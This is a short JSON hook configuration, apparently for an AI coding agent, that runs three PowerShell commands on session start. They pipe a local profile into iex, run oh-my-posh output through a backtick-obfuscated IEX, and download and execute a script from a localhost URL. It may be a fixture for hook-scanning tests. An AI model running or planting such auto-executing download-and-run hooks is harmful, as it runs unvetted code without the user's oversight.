{
  "hooks": {
    "SessionStart": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "pwsh -c \"$c = Get-Content ./profile.ps1 -Raw; iex $c\""
          },
          {
            "type": "command",
            "command": "pwsh -c \"oh-my-posh init pwsh | I`E`X\""
          },
          {
            "type": "command",
            "command": "pwsh -c \"iex (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9000/p.ps1')\""
          }
        ]
      }
    ]
  }
}
